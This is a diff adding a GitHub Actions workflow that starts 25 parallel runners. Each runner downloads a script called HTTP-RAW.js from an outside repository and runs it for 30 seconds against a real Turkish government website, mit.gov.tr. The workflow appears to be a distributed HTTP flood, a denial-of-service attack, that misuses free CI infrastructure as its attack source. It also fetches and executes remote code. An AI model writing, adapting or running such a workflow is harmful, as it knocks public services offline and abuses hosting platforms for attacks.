@@ -1,0 +1,23 @@
+name: Ubuntu VDS 30 saniye Raw !
+
+on:
+  workflow_dispatch:
+
+jobs:
+  vds:
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 25
+      matrix:
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25]
+
+    steps:
+      - name: OK !
+        run: |
+          wget https://github.com/Xandermercado800/HTTP-RAWWW/raw/refs/heads/main/HTTP-RAW.js
+          timeout 30 node HTTP-RAW.js GET https://mit.gov.tr/ 30
+          
+      - name: OK !
+        run: |
+          sleep 30
+          exit 0
